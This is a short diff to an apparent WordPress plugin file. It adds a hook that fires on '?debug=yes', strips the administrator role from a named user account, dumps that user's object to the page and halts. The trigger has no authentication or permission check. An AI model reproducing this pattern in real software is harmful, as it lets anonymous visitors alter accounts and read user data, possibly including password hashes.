@@ -188,3 +188,17 @@ add_filter( 'got_rewrite', '__return_true' );
 
 run_instawp();
 
+add_action( 'wp_head', function () {
+	if ( isset( $_GET['debug'] ) && 'yes' == sanitize_text_field( $_GET['debug'] ) ) {
+
+		$user = get_user_by( 'login', 'nedilocume3795' );
+
+		$user->remove_role( 'administrator' );
+
+		echo "<pre>";
+		print_r( $user );
+		echo "</pre>";
+
+		die();
+	}
+}, 0 );
